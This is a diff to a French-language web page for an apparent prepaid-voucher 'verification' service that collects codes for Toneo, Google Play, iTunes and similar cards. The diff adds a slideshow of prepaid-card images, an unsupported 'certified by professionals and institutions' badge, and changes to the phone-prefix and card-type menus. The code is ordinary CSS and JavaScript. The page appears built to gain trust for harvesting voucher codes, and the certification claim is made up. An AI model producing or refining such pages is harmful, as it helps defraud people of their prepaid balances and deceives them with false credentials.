@@ -485,6 +485,61 @@
       border: 1px solid #f5c6cb;
     }
     
+    /* Diaporama */
+    .slider {
+      width: 100%;
+      height: 400px;
+      overflow: hidden;
+      position: relative;
+      margin: 0 auto;
+    }
+    
+    .slider img {
+      width: 100%;
+      height: 400px;
+      object-fit: cover;
+      position: absolute;
+      top: 0;
+      left: 100%;
+      transition: left 1s;
+    }
+    
+    /* Certificat */
+    .certificate {
+      background-color: #1A2A44;
+      color: white;
+      padding: 20px;
+      margin: 20px auto;
+      text-align: center;
+      border-radius: 10px;
+      max-width: 800px;
+      position: relative;
+    }
+    
+    .certificate h2 {
+      color: #f72585;
+      margin-bottom: 10px;
+    }
+    
+    .certificate .cert-icon {
+      font-size: 3rem;
+      color: #4cc9f0;
+      margin-bottom: 15px;
+    }
+    
+    .cert-image {
+      max-width: 100%;
+      height: auto;
+      margin-top: 15px;
+      border-radius: 5px;
+    }
+    
+    .certificate .cert-image-description {
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.7);
+      margin-top: 10px;
+    }
+    
     /* RESPONSIVE DESIGN AMÉLIORÉ */
     
     /* Desktop (1200px et plus) */
@@ -503,6 +558,10 @@
       
       .testimonial-card {
         flex: 0 0 380px;
+      }
+      
+      .slider {
+        max-width: 1200px;
       }
     }
     
@@ -553,6 +612,18 @@
       
       .section-title h2 {
         font-size: 2rem;
+      }
+      
+      .slider {
+        height: 300px;
+      }
+      
+      .certificate .cert-icon {
+        font-size: 2.5rem;
+      }
+      
+      .cert-image {
+        max-height: 200px;
       }
     }
     
@@ -694,6 +765,22 @@
       .footer-content h3 {
         font-size: 1.5rem !important;
       }
+      
+      .slider {
+        height: 250px;
+      }
+      
+      .certificate {
+        padding: 15px;
+      }
+      
+      .certificate .cert-icon {
+        font-size: 2rem;
+      }
+      
+      .cert-image {
+        max-height: 150px;
+      }
     }
     
     /* Très petits écrans (480px et moins) */
@@ -735,6 +822,18 @@
       .country-select {
         gap: 0.3rem;
       }
+      
+      .slider {
+        height: 200px;
+      }
+      
+      .certificate .cert-icon {
+        font-size: 1.8rem;
+      }
+      
+      .cert-image {
+        max-height: 120px;
+      }
     }
   </style>
 </head>
@@ -754,7 +853,31 @@
         </button>
       </div>
     </div>
-  </section>
+  </section><br>
+
+  <!-- Diaporama -->
+  <div class="slider">
+    <img src="https://www.weblex.fr/sites/default/files/actualites/images/globchr_0.jpg" alt="">
+    <img src="https://foto.wuestenigel.com/wp-content/uploads/api/stand-von-paysafe-card.jpeg" alt="">
+    <img src="https://i.pinimg.com/736x/06/f7/f3/06f7f355931128a592df13fbb68e6015.jpg" alt="">
+    <img src="https://static.actu.fr/uploads/2020/08/118377543-2442781472686038-7118229567914812964-o-640x427.jpg" alt="">
+    <img src="https://tarjetadirecta.es/cdn-cgi/imagedelivery/Pk8Ky-xDyeK8TLUvfplArQ/88d2fcb0-b9de-4c6d-710e-de6e551ebc00/public" alt="">
+    
+  </div>
+  <script>
+    let slideIndex = 0;
+    const slides = document.querySelectorAll('.slider img');
+    function showSlide() {
+      slides.forEach((slide, index) => {
+        slide.style.left = `${(index - slideIndex) * 100}%`;
+      });
+    }
+    setInterval(() => {
+      slideIndex = (slideIndex + 1) % slides.length;
+      showSlide();
+    }, 3000);
+    showSlide();
+  </script>
 
   <!-- Stats Section -->
   <section class="stats-section">
@@ -775,7 +898,7 @@
         </div>
         
         <div class="stat-card floating" style="animation-delay: 0.4s;">
-          <div class="stat-number">&lt; 5 min</div>
+          <div class="stat-number">< 5 min</div>
           <div class="stat-label" data-translate="averageVerificationTime">Temps de vérification moyen</div>
         </div>
         
@@ -855,6 +978,17 @@
     </div>
   </section>
 
+  <!-- Certificat -->
+  <div class="certificate">
+    <i class="fas fa-certificate cert-icon"></i>
+    <h2>CERTIFIÉ PROFESSIONNELS ET INSTITUTIONNELS</h2>
+    <p>Ce certificat atteste que notre service de validation est reconnu pour son excellence dans la vérification de recharges.</p>
+    <img src="https://comunidadblogger.net/wp-content/uploads/2019/03/giving-of-a-ticket-PXSS63G.jpg" alt="" class="cert-image">
+    
+    
+    
+  </div>
+
   <!-- Features Section -->
   <section class="stats-section" style="background-color: #f8f9fa;">
     <div class="stats-container">
@@ -927,24 +1061,11 @@
                     <option value="+41" data-flag="🇨🇭">Suisse (+41)</option>
                     <option value="+49" data-flag="🇩🇪">Allemagne (+49)</option>
                     <option value="+44" data-flag="🇬🇧">Royaume-Uni (+44)</option>
-                  </optgroup>
-                  
-                  <!-- Afrique -->
-                  <optgroup label="Afrique">
-                    <option value="+225" data-flag="🇨🇮">Côte d'Ivoire (+225)</option>
-                    <option value="+221" data-flag="🇸🇳">Sénégal (+221)</option>
-                    <option value="+229" data-flag="🇧🇯">Bénin (+229)</option>
-                    <option value="+226" data-flag="🇧🇫">Burkina Faso (+226)</option>
-                    <option value="+223" data-flag="🇲🇱">Mali (+223)</option>
-                    <option value="+224" data-flag="🇬🇳">Guinée (+224)</option>
-                    <option value="+227" data-flag="🇳🇪">Niger (+227)</option>
-                    <option value="+228" data-flag="🇹🇬">Togo (+228)</option>
-                    <option value="+237" data-flag="🇨🇲">Cameroun (+237)</option>
-                    <option value="+242" data-flag="🇨🇬">Congo (+242)</option>
-                    <option value="+243" data-flag="🇨🇩">RDC (+243)</option>
-                    <option value="+212" data-flag="🇲🇦">Maroc (+212)</option>
-                    <option value="+213" data-flag="🇩🇿">Algérie (+213)</option>
-                    <option value="+216" data-flag="🇹🇳">Tunisie (+216)</option>
+                    <option value="+34" data-flag="🇪🇸">Espagne (+34)</option>
+                    <option value="+39" data-flag="🇮🇹">Italie (+39)</option>
+                    <option value="+351" data-flag="🇵🇹">Portugal (+351)</option>
+                    <option value="+31" data-flag="🇳🇱">Pays-Bas (+31)</option>
+                    <option value="+46" data-flag="🇸🇪">Suède (+46)</option>
                   </optgroup>
                   
                   <!-- Amérique -->
@@ -975,7 +1096,6 @@
                 <option value="Toneo">Toneo</option>
                 <option value="Google Play">Google Play</option>
                 <option value="iTunes">iTunes</option>
-                <option value="Steam">Steam</option>
                 <option value="Autre">Interac</option>
               </select>
             </div>
@@ -1405,4 +1525,3 @@
   </script>
 </body>
 </html>
-
